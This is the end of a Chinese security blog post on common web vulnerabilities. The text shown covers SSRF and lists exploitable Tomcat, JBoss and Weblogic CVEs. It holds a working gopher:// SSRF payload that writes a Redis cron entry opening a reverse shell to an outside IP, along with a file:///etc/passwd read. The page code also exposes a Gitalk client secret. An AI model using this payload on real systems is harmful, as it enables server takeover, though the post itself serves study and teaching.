+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>
+
+<p>gopher是一个互联网上使用的分布型的文件搜集获取网络协议.可以利用它构造post数据包发送TCP数据流,tcp70端口,如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码,gopher协议是ssrf利用中最强大的协议.</p>
+<p>gopher -ssrf payload 生成脚本:<a target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a></p>
+<p>参考:<a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/index.html">https://websec.readthedocs.io/zh/latest/vuln/index.html</a></p>
+<h2 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h2><p><strong>tomcat</strong><br>默认端口:8080<br>1.弱口令 &amp;&amp; 后台getshell漏洞,上传war包<br>2.Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）<br>3.Tomcat AJP 文件包含漏洞（CVE-2020-1938）</p>
+<p><strong>jboss</strong><br>默认端口:8080<br>1.JBoss JMXInvokerServlet 反序列化漏洞<br>2.JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）<br>3.JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）<br><strong>weblogic</strong><br>默认端口:7001<br>1.Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）<br>2.Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）<br>3.Weblogic 任意文件上传漏洞（CVE-2018-2894）后台<br>4.Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）<br>5.Weblogic SSRF漏洞</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/57748/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2022-01-08 20:54:52
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/web%E6%B8%97%E9%80%8F/" title="web渗透">
+                        <b>#</b> web渗透
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/posts/36387/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">PHP文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">本地文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">php伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-text">同源策略解决方案</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cors"><span class="toc-text">Cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Jsonp"><span class="toc-text">Jsonp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-text">中间件漏洞</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+  <script src="/js/src/md5.min.js"></script>
+  <div id="gitalk-container"></div>
+
+  <script>
+    const gitalk = new Gitalk({
+      clientID: 'a8912b1aa74ebdeb8ecf',
+      clientSecret: '2e09f32571113ed72c6902713871ee0702291593',
+      repo: 'bstark',
+      owner: 'bbbstark',
+      admin: ['bbbstark'],
+      id: location.pathname,
+      distractionFreeMode: false
+    })
+
+    gitalk.render('gitalk-container')
+  </script>
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/bbbstark">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" href="">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" href="">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a href="https://bstark.me">Copyright © Bstark 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        Theme by Oranges | Powered by Hexo
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E + '&url=' + https%3A%2F%2Fbstark.me%2Fposts%2F51374%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://bstark.me/posts/51374/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
